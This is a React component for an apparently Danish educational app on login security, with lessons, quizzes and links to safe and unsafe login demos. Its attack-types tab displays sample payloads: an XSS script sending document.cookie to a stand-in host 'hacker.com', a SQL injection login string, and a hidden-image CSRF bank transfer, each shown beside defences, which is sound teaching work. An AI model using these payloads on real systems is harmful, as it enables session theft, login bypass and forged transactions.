import { useState, useEffect } from 'react';
import { Box, Title, Text, Container, Paper, Tabs, Card, Group, ThemeIcon, Badge, List, Button, Progress, SimpleGrid, Accordion, Divider, Image, Alert } from '@mantine/core';
import { Shield, WarningOctagon, Book, LockKey, CodeBlock, CheckCircle, X, CaretRight, Brain, Info, Lightning, Check, Medal, Trophy, ArrowLeft, ArrowRight } from '@phosphor-icons/react';
import { Link, useNavigate } from '@tanstack/react-router';
import { RestartButton } from '../components/RestartButton';

function Learn() {
	const [activeTab, setActiveTab] = useState<string | null>('intro');
	const [completedLessons, setCompletedLessons] = useState<string[]>([]);
	const [isProgressComplete, setIsProgressComplete] = useState(false);
	const [showQuiz, setShowQuiz] = useState(false);
	const [quizAnswered, setQuizAnswered] = useState(false);
	const [quizzesCompleted, setQuizzesCompleted] = useState<{ [key: string]: boolean }>({});
	const [showAchievement, setShowAchievement] = useState({ show: false, title: '' });

	const navigate = useNavigate();

	useEffect(() => {
		if (activeTab && !completedLessons.includes(activeTab)) {
			markLessonCompleted(activeTab);
		}
	}, [activeTab]);

	const markLessonCompleted = (lessonId: string) => {
		if (!completedLessons.includes(lessonId)) {
			setCompletedLessons([...completedLessons, lessonId]);
			setShowAchievement({
				show: true,
				title: `Afsnit gennemført: ${lessonId === 'intro' ? 'Introduktion' : lessonId === 'history' ? 'Historisk Kontekst' : lessonId === 'attacks' ? 'Angrebstyper' : lessonId === 'best-practices' ? 'Bedste Praksis' : lessonId === 'psychology' ? 'Psykologiske Aspekter' : 'Nyt afsnit'}`,
			});
		}
	};

	const isLessonCompleted = (lessonId: string) => {
		return completedLessons.includes(lessonId);
	};

	const isQuizCompletedForTab = (tabId: string) => {
		return quizzesCompleted[tabId] || false;
	};

	const calculateProgress = () => {
		const totalLessons = 5;
		const progress = Math.round((completedLessons.length / totalLessons) * 100);

		if (progress === 100 && !isProgressComplete) {
			setIsProgressComplete(true);
			setShowAchievement({
				show: true,
				title: 'Læringsmodul 100% Gennemført!',
			});
		}

		return progress;
	};

	const getNextTab = (currentTab: string | null) => {
		const tabs = ['intro', 'history', 'attacks', 'best-practices', 'psychology'];
		const currentIndex = tabs.indexOf(currentTab || 'intro');
		return tabs[(currentIndex + 1) % tabs.length];
	};

	const getNextRoute = () => {
		if (completedLessons.length >= 5) {
			return '/login-safe';
		}
		const nextTab = getNextTab(activeTab);
		setActiveTab(nextTab);
		return '/learn';
	};

	const NavigationButtons = () => (
		<Box pos='fixed' top={20} right={20} style={{ zIndex: 1000 }}> 
			<Group>
				<Button variant='light' color='gray' leftSection={<ArrowLeft size={16} />} onClick={() => navigate({ to: '/' })}>
					Gå tilbage
				</Button>

				<Button variant='filled' color='blue' rightSection={<ArrowRight size={16} />} onClick={() => navigate({ to: getNextRoute() })}>
					Gå videre
				</Button>
			</Group>
		</Box>
	);

	const AchievementPopup = ({ title, show, onComplete }: { title: string; show: boolean; onComplete: () => void }) => {
		useEffect(() => {
			if (show) {
				const timer = setTimeout(() => {
					onComplete();
				}, 3000);

				return () => clearTimeout(timer);
			}
		}, [show, onComplete]);

		return show ? (
			<Paper style={{ position: 'fixed', bottom: 20, right: 20, zIndex: 1000 }} withBorder p='md' className='bg-gradient-to-r from-yellow-900 to-orange-900'>
				<Group>
					<ThemeIcon size='lg' radius='xl' color='yellow'>
						<Trophy size={20} weight='fill' />
					</ThemeIcon>
					<div>
						<Text size='xs' c='dimmed'>
							Bedrift Opnået!
						</Text>
						<Text fw='bold'>{title}</Text>
					</div>
				</Group>
			</Paper>
		) : null;
	};

	const QuizComponent = ({ question, options, correctIndex, lessonId }: { question: string; options: string[]; correctIndex: number; lessonId: string }) => (
		<Card withBorder className='bg-blue-900/30 mt-4'>
			<Title order={4} mb={12}>
				Quiz: Test din viden
			</Title>
			<Text mb={16}>{question}</Text>

			<SimpleGrid cols={2} spacing='sm'>
				{options.map((option, index) => (
					<Button
						key={index}
						variant={quizAnswered ? (index === correctIndex ? 'filled' : 'light') : 'default'}
						color={quizAnswered ? (index === correctIndex ? 'green' : 'red') : 'blue'}
						onClick={() => {
							setQuizAnswered(true);
							if (index === correctIndex) {
								setQuizzesCompleted({ ...quizzesCompleted, [lessonId]: true });
								markLessonCompleted(lessonId);
							}
						}}
						leftSection={quizAnswered && index === correctIndex ? <Check size={16} /> : null}
						disabled={quizAnswered}
					>
						{option}
					</Button>
				))}
			</SimpleGrid>

			{quizAnswered && (
				<Group mt={16} justify='flex-end'>
					<Button
						color='blue'
						onClick={() => {
							setQuizAnswered(false);
							setShowQuiz(false);
							setActiveTab(getNextTab(activeTab));
						}}
					>
						Fortsæt til næste emne
					</Button>
				</Group>
			)}
		</Card>
	);

	return (
		<Box p='xl'>
			<NavigationButtons />

			<Container size='xl'>
				<Paper withBorder p='lg' radius='md' className='bg-blue-900/10 text-white mb-6'>
					<Group justify='space-between' className='mb-4'>
						<Group>
							<Book size={30} className='text-blue-400' weight='fill' />
							<Title order={2}>Lær om Login Sikkerhed</Title>
						</Group>
						<Badge color='blue' size='lg'>
							{calculateProgress()}% Gennemført
						</Badge>
					</Group>

					<Progress value={calculateProgress()} size='md' className='mb-4' color='blue' />

					<Text size='lg' mb={24}>
						Udforsk sikker login praksis og typiske hackerangreb
					</Text>

					<Tabs value={activeTab} onChange={setActiveTab} className='mb-6' color='blue'>
						<Tabs.List grow>
							<Tabs.Tab value='intro' leftSection={<Info size={16} />}>
								Introduktion
								{isLessonCompleted('intro') && <Check size={12} className='ml-1' />}
							</Tabs.Tab>
							<Tabs.Tab value='history' leftSection={<Book size={16} />}>
								Historisk Kontekst
								{isLessonCompleted('history') && <Check size={12} className='ml-1' />}
							</Tabs.Tab>
							<Tabs.Tab value='attacks' leftSection={<Lightning size={16} />}>
								Angrebstyper
								{isLessonCompleted('attacks') && <Check size={12} className='ml-1' />}
							</Tabs.Tab>
							<Tabs.Tab value='best-practices' leftSection={<Shield size={16} />}>
								Bedste Praksis
								{isLessonCompleted('best-practices') && <Check size={12} className='ml-1' />}
							</Tabs.Tab>
							<Tabs.Tab value='psychology' leftSection={<Brain size={16} />}>
								Psykologi
								{isLessonCompleted('psychology') && <Check size={12} className='ml-1' />}
							</Tabs.Tab>
						</Tabs.List>

						<Tabs.Panel value='intro' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Login Sikkerhed Basis
									</Title>

									<Image src='./enigma.png' alt='Enigma maskine' height={150} fit='contain' className='mb-4' />

									<Text mb={16}>Login-systemer beskytter følsomme oplysninger og er et almindeligt mål for hackere.</Text>

									<List spacing='sm' mb={16}>
										<List.Item icon={<CaretRight size={14} />}>Kryptografi og autentifikation</List.Item>
										<List.Item icon={<CaretRight size={14} />}>Almindelige sårbarheder</List.Item>
										<List.Item icon={<CaretRight size={14} />}>Bedste sikkerhedspraksis</List.Item>
									</List>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={12}>
										Læringsveje
									</Title>

									<Text size='sm' mb={16}>
										To måder at udforske materialet:
									</Text>

									<List spacing='md' mb={20}>
										<List.Item
											icon={
												<ThemeIcon color='green' size='md' radius='xl'>
													<LockKey size={16} weight='bold' />
												</ThemeIcon>
											}
										>
											<Text fw='bold'>Guidet rejse</Text>
											<Text size='sm'>Følg fanebladsinddelingen fra venstre til højre</Text>
										</List.Item>
										<List.Item
											icon={
												<ThemeIcon color='orange' size='md' radius='xl'>
													<Brain size={16} weight='bold' />
												</ThemeIcon>
											}
										>
											<Text fw='bold'>Praktisk læring</Text>
											<Text size='sm'>Udforsk sikker og usikker login-implementation</Text>
										</List.Item>
									</List>
								</Card>
							</SimpleGrid>

							{!isQuizCompletedForTab('intro') && !showQuiz && (
								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
									Tag quizzen
								</Button>
							)}

							{showQuiz && !isQuizCompletedForTab('intro') && <QuizComponent question='Hvad er den største fordel ved at bruge stærk login-sikkerhed?' options={['Det ser professionelt ud', 'Det beskytter brugerdata mod uautoriseret adgang', 'Det øger hjemmesidens hastighed', 'Det reducerer serveromkostningerne']} correctIndex={1} lessonId='intro' />}
						</Tabs.Panel>

						<Tabs.Panel value='history' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Enigma-maskinen
									</Title>

									<Image src='https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/EnigmaMachineLabeled.jpg/300px-EnigmaMachineLabeled.jpg' alt='Enigma maskine' mah={240} fit='contain' className='mb-4' />

									<Text mb={16}>Enigma var en krypteringsanordning brugt under 2. Verdenskrig. Den skabte koder der dengang blev anset som ubrydelige.</Text>

									<List
										spacing='sm'
										mb={16}
										icon={
											<ThemeIcon color='blue' size='sm' radius='xl'>
												<Info size={14} />
											</ThemeIcon>
										}
									>
										<List.Item>Brugte roterende hjul til at ændre bogstaver</List.Item>
										<List.Item>Daglige indstillinger ændrede koden</List.Item>
										<List.Item>Alan Turing brød koden ved Bletchley Park</List.Item>
									</List>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Fra Enigma til Moderne Login
									</Title>

									<Text mb={16}>Paralleller mellem Enigma og moderne sikkerhed:</Text>

									<SimpleGrid cols={1} spacing='md' mb={16}>
										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Kompleksitet
											</Title>
											<Text size='sm'>Enigma: roterende hjul. Moderne login: hashing og kryptering.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Svagheder
											</Title>
											<Text size='sm'>Enigma: sårbar over for mønstre. Moderne login: sårbar over for dårlige adgangskoder.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Mennesket som svaghed
											</Title>
											<Text size='sm'>Både Enigma og moderne systemer har mennesker som svageste led.</Text>
										</Paper>
									</SimpleGrid>
								</Card>
							</SimpleGrid>

							{!isQuizCompletedForTab('history') && !showQuiz && (
								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
									Tag quizzen
								</Button>
							)}

							{showQuiz && !isQuizCompletedForTab('history') && <QuizComponent question='Hvilken historisk kryptografisk enhed har påvirket moderne sikkerhedstankegang?' options={['Smartphones', 'Enigma-maskinen', 'Håndskrevne breve', 'Fax-maskiner']} correctIndex={1} lessonId='history' />}
						</Tabs.Panel>

						<Tabs.Panel value='attacks' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Almindelige Angrebstyper
									</Title>

									<Tabs variant='pills' radius='md' defaultValue='xss' className='mb-4' color='red'>
										<Tabs.List grow>
											<Tabs.Tab value='xss' leftSection={<CodeBlock size={16} />}>
												XSS
											</Tabs.Tab>
											<Tabs.Tab value='sql' leftSection={<CodeBlock size={16} />}>
												SQL Injection
											</Tabs.Tab>
											<Tabs.Tab value='csrf' leftSection={<CodeBlock size={16} />}>
												CSRF
											</Tabs.Tab>
										</Tabs.List>

										<Tabs.Panel value='xss' pt='md'>
											<Title order={4} mb={8}>
												Cross-Site Scripting (XSS)
											</Title>

											<Text mb={12}>XSS-angreb indsprøjter kode i en webside for at køre i brugernes browsere.</Text>

											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>{`<input value="<script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>">`}</div>

											<Title order={6} mb={4}>
												Beskyttelse
											</Title>
											<List size='sm' mb={12}>
												<List.Item>Sanitér alt brugerinput</List.Item>
												<List.Item>Anvend Content Security Policy</List.Item>
												<List.Item>Brug frameworks som React</List.Item>
											</List>

											<Link to='/login-unsafe' className='w-full'>
												<Button color='red' variant='light' fullWidth>
													Se XSS Demo
												</Button>
											</Link>
										</Tabs.Panel>

										<Tabs.Panel value='sql' pt='md'>
											<Title order={4} mb={8}>
												SQL Injection
											</Title>

											<Text mb={12}>SQL-injektion manipulerer database-forespørgsler via ondsindet kode.</Text>

											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>
												{`username: admin' OR 1=1 --
query: SELECT * FROM users WHERE username='admin' OR 1=1 --'`}
											</div>

											<Title order={6} mb={4}>
												Beskyttelse
											</Title>
											<List size='sm' mb={12}>
												<List.Item>Brug parameteriserede forespørgsler</List.Item>
												<List.Item>Anvend ORM-værktøjer</List.Item>
												<List.Item>Validér alt brugerinput</List.Item>
											</List>

											<Link to='/login-unsafe' className='w-full'>
												<Button color='red' variant='light' fullWidth>
													Se SQL Injection Demo
												</Button>
											</Link>
										</Tabs.Panel>

										<Tabs.Panel value='csrf' pt='md'>
											<Title order={4} mb={8}>
												Cross-Site Request Forgery (CSRF)
											</Title>

											<Text mb={12}>CSRF-angreb tvinger brugere til at udføre uønskede handlinger på sider, hvor de er logget ind.</Text>

											<div className='font-mono text-xs bg-red-950 overflow-x-auto p-2 border border-red-500 rounded mb-4'>
												{`<!-- Ondsindet webside -->
<img src="https://bank.com/transfer?to=hacker&amount=1000" style="display:none">`}
											</div>

											<Title order={6} mb={4}>
												Beskyttelse
											</Title>
											<List size='sm' mb={12}>
												<List.Item>Implementér CSRF-tokens</List.Item>
												<List.Item>Brug SameSite cookie-attributter</List.Item>
												<List.Item>Kræv bekræftelse for følsomme handlinger</List.Item>
											</List>

											<Link to='/login-safe' className='w-full'>
												<Button color='green' variant='light' fullWidth>
													Se CSRF Beskyttelse
												</Button>
											</Link>
										</Tabs.Panel>
									</Tabs>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Andre Sikkerhedstrusler
									</Title>

									<SimpleGrid cols={2} spacing='md' mb={20}>
										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Brute Force</Text>
											</Group>
											<Text size='sm'>Systematisk afprøvning af adgangskoder. Beskyttelse: Rate limiting, account lockout, captchas.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Credential Stuffing</Text>
											</Group>
											<Text size='sm'>Brug af lækkede login-oplysninger. Beskyttelse: Unikke adgangskoder, to-faktor autentifikation.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Phishing</Text>
											</Group>
											<Text size='sm'>Falske emails eller websites. Beskyttelse: Uddannelse, HTTPS, anti-phishing værktøjer.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-red-900/30'>
											<Group mb={8}>
												<ThemeIcon color='red' size='md' radius='xl'>
													<X size={16} weight='bold' />
												</ThemeIcon>
												<Text fw='bold'>Man-in-the-Middle</Text>
											</Group>
											<Text size='sm'>Opsnapning af kommunikation. Beskyttelse: HTTPS, certificate pinning, kryptering.</Text>
										</Paper>
									</SimpleGrid>
								</Card>
							</SimpleGrid>

							{!isQuizCompletedForTab('attacks') && !showQuiz && (
								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
									Tag quizzen
								</Button>
							)}

							{showQuiz && !isQuizCompletedForTab('attacks') && <QuizComponent question='Hvad er SQL Injection?' options={['En type anti-virus software', 'Et angreb der manipulerer database-forespørgsler via brugerinput', 'Et værktøj til at teste webside-hastighed', 'Et system til at tilføje data til en database']} correctIndex={1} lessonId='attacks' />}
						</Tabs.Panel>

						<Tabs.Panel value='best-practices' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Bedste Praksis for Login Sikkerhed
									</Title>

									<Accordion variant='separated' mb={20}>
										<Accordion.Item value='password-storage'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>Sikker Adgangskode Opbevaring</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<List spacing='sm'>
													<List.Item>Gem aldrig adgangskoder i klartekst</List.Item>
													<List.Item>Brug bcrypt, Argon2 eller PBKDF2 til hashing</List.Item>
													<List.Item>Tilføj unikke salt-værdier før hashing</List.Item>
													<List.Item>Anvend tilstrækkelige arbejdsfaktorer</List.Item>
												</List>

												<div className='font-mono text-xs bg-green-950 overflow-x-auto p-2 border border-green-500 rounded my-4'>
													{`// Hashing af adgangskode
const hashedPassword = await bcrypt.hash(password, 12);

// Verificering
const isMatch = await bcrypt.compare(input, hashedPassword);`}
												</div>
											</Accordion.Panel>
										</Accordion.Item>

										<Accordion.Item value='authentication'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>Robust Autentifikation</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<List spacing='sm'>
													<List.Item>Implementér to-faktor autentifikation (2FA)</List.Item>
													<List.Item>Kræv stærke adgangskoder</List.Item>
													<List.Item>Brug sikker session management</List.Item>
													<List.Item>Implementér rate limiting</List.Item>
												</List>
											</Accordion.Panel>
										</Accordion.Item>

										<Accordion.Item value='csrf-protection'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>CSRF-beskyttelse</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<List spacing='sm'>
													<List.Item>Generér unikke CSRF-tokens for hver session</List.Item>
													<List.Item>Inkluder tokens i alle formularer</List.Item>
													<List.Item>Validér tokens på serversiden</List.Item>
													<List.Item>Brug SameSite cookie-attributten</List.Item>
												</List>

												<div className='font-mono text-xs bg-green-950 overflow-x-auto p-2 border border-green-500 rounded my-4'>
													{`// Generér CSRF token
const csrfToken = crypto.randomBytes(16).toString('hex');

// På klientsiden
<input type="hidden" name="csrf_token" value="${'{csrfToken}'}" />`}
												</div>
											</Accordion.Panel>
										</Accordion.Item>

										<Accordion.Item value='input-validation'>
											<Accordion.Control icon={<Shield size={18} className='text-green-400' />}>
												<Text fw='bold'>Input Validering</Text>
											</Accordion.Control>
											<Accordion.Panel>
												<List spacing='sm'>
													<List.Item>Valider input på klient- og serverside</List.Item>
													<List.Item>Brug whitelisting frem for blacklisting</List.Item>
													<List.Item>Sanitér output til brugeren</List.Item>
													<List.Item>Anvend prepared statements</List.Item>
												</List>
											</Accordion.Panel>
										</Accordion.Item>
									</Accordion>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Sikkerhedssammenligning
									</Title>

									<Paper withBorder p='md' radius='md' className='bg-blue-900/40 mb-4'>
										<Group justify='space-between' mb={8}>
											<Group>
												<Shield size={20} className='text-green-400' weight='fill' />
												<Text fw='bold'>Sikker Implementation</Text>
											</Group>
											<Badge color='green'>Anbefalet</Badge>
										</Group>

										<SimpleGrid cols={2} spacing='xs'>
											<Text size='sm'>✓ Hashing og salting</Text>
											<Text size='sm'>✓ CSRF-beskyttelse</Text>
											<Text size='sm'>✓ Input sanitering</Text>
											<Text size='sm'>✓ Rate limiting</Text>
											<Text size='sm'>✓ Parameteriserede queries</Text>
											<Text size='sm'>✓ HttpOnly cookies</Text>
										</SimpleGrid>
									</Paper>

									<Paper withBorder p='md' radius='md' className='bg-red-900/40 mb-12'>
										<Group justify='space-between' mb={8}>
											<Group>
												<WarningOctagon size={20} className='text-red-400' weight='fill' />
												<Text fw='bold'>Usikker Implementation</Text>
											</Group>
											<Badge color='red'>Farlig</Badge>
										</Group>

										<SimpleGrid cols={2} spacing='xs'>
											<Text size='sm'>✗ Klartekst adgangskoder</Text>
											<Text size='sm'>✗ Ingen CSRF-tokens</Text>
											<Text size='sm'>✗ Sårbar over for XSS</Text>
											<Text size='sm'>✗ Ubegrænset login-forsøg</Text>
											<Text size='sm'>✗ SQL-injektion sårbarhed</Text>
											<Text size='sm'>✗ Usikker session håndtering</Text>
										</SimpleGrid>
									</Paper>

									<Group justify='space-between'>
										<Button variant='light' color='green' onClick={() => navigate({ to: '/login-safe' })}>
											Prøv Sikker Login
										</Button>

										<Button variant='light' color='red' onClick={() => navigate({ to: '/login-unsafe' })}>
											Prøv Usikker Login
										</Button>
									</Group>
								</Card>
							</SimpleGrid>

							{!isQuizCompletedForTab('best-practices') && !showQuiz && (
								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
									Tag quizzen
								</Button>
							)}

							{showQuiz && !isQuizCompletedForTab('best-practices') && <QuizComponent question='Hvad er den sikreste måde at gemme brugeradgangskoder på?' options={['I en tekstfil på serveren', 'I klartekst i databasen', 'Hashet og saltet med en sikker algoritme', 'Base64-encodet']} correctIndex={2} lessonId='best-practices' />}
						</Tabs.Panel>

						<Tabs.Panel value='psychology' pt='xl'>
							<SimpleGrid cols={2} spacing='lg'>
								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Psykologiske Aspekter
									</Title>

									<Text mb={16}>Forståelse af menneskelig psykologi er afgørende for sikkerhed. Mange brud skyldes brugeradfærd, ikke tekniske fejl.</Text>

									<SimpleGrid cols={2} spacing='md' mb={20}>
										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Bekvemlighed vs. Sikkerhed
											</Title>
											<Text size='sm'>Mennesker prioriterer ofte bekvemmelighed over sikkerhed. Derfor genbruges simple adgangskoder.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Social Engineering
											</Title>
											<Text size='sm'>Udnytter tillid og psykologiske tendenser gennem phishing og baiting.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Sikkerhedstræthed
											</Title>
											<Text size='sm'>For mange sikkerhedskrav fører til at brugere ignorerer forholdsregler.</Text>
										</Paper>

										<Paper withBorder p='md' radius='md' className='bg-blue-900/30'>
											<Title order={5} mb={8}>
												Risikoperception
											</Title>
											<Text size='sm'>Mennesker undervurderer cybertrusler fordi de er usynlige eller abstrakte.</Text>
										</Paper>
									</SimpleGrid>
								</Card>

								<Card withBorder radius='md' className='bg-blue-900/20'>
									<Title order={3} mb={16}>
										Brugervenlig Sikkerhed
									</Title>

									<Text mb={16}>At forene sikkerhed med god brugeroplevelse kræver:</Text>

									<List
										spacing='md'
										mb={20}
										icon={
											<ThemeIcon color='green' size='md' radius='xl'>
												<Check size={16} weight='bold' />
											</ThemeIcon>
										}
									>
										<List.Item>
											<Text fw='bold'>Gør det sikre nemt</Text>
											<Text size='sm'>Design hvor den sikreste vej er den nemmeste</Text>
										</List.Item>

										<List.Item>
											<Text fw='bold'>Synlig sikkerhed</Text>
											<Text size='sm'>Giv klar, relevant sikkerhedsfeedback til brugeren</Text>
										</List.Item>

										<List.Item>
											<Text fw='bold'>Reducér valg</Text>
											<Text size='sm'>Brug sikre standardindstillinger</Text>
										</List.Item>

										<List.Item>
											<Text fw='bold'>Design for fejl</Text>
											<Text size='sm'>Systemer der håndterer fejl sikkert</Text>
										</List.Item>
									</List>

									<Paper withBorder p='md' radius='md' className='bg-blue-900/40 mb-12 italic'>
										<Text>"Hvis du tror teknologi kan løse dine sikkerhedsproblemer, forstår du hverken problemerne eller teknologien."</Text>
										<Text size='sm' ta='right' mt={8}>
											— Bruce Schneier
										</Text>
									</Paper>
								</Card>
							</SimpleGrid>

							{!isQuizCompletedForTab('psychology') && !showQuiz && (
								<Button color='blue' onClick={() => setShowQuiz(true)} rightSection={<CaretRight size={16} />} fullWidth mt={16}>
									Tag quizzen
								</Button>
							)}

							{showQuiz && !isQuizCompletedForTab('psychology') && <QuizComponent question='Hvorfor vælger mange brugere svage adgangskoder selvom de ved det er usikkert?' options={['De har ikke nok teknisk viden', 'De prioriterer bekvemmelighed over sikkerhed', 'De tror ikke deres konti er værdifulde', 'De stoler på at firmaerne beskytter dem']} correctIndex={1} lessonId='psychology' />}

							{completedLessons.includes('psychology') && (
								<Box mt={16}>
									<Alert color='green' className='mb-6'>
										<Group>
											<Medal size={24} weight='fill' className='text-yellow-400' />
											<Text fw='bold'>Tillykke! Du har nu lært de grundlæggende principper om login-sikkerhed.</Text>
										</Group>
									</Alert>

									<SimpleGrid cols={2} spacing='lg'>
										<Card withBorder className='bg-green-900/20'>
											<Title order={5} mb={8}>
												Prøv Sikker Login
											</Title>
											<Text size='sm' mb={12}>
												Se sikkerhedsprincipperne i praksis.
											</Text>
											<Button color='green' rightSection={<CaretRight size={16} />} onClick={() => navigate({ to: '/login-safe' })} fullWidth>
												Gå til Sikker Login
											</Button>
										</Card>

										<Card withBorder className='bg-red-900/20'>
											<Title order={5} mb={8}>
												Prøv Usikker Login
											</Title>
											<Text size='sm' mb={12}>
												Opdag sårbarheder og prøv forskellige angreb.
											</Text>
											<Button color='red' rightSection={<CaretRight size={16} />} onClick={() => navigate({ to: '/login-unsafe' })} fullWidth>
												Gå til Usikker Login
											</Button>
										</Card>
									</SimpleGrid>
								</Box>
							)}
						</Tabs.Panel>
					</Tabs>
				</Paper>
			</Container>

			<RestartButton />

			<AchievementPopup show={showAchievement.show} title={showAchievement.title} onComplete={() => setShowAchievement({ show: false, title: '' })} />
		</Box>
	);
}

export default Learn;
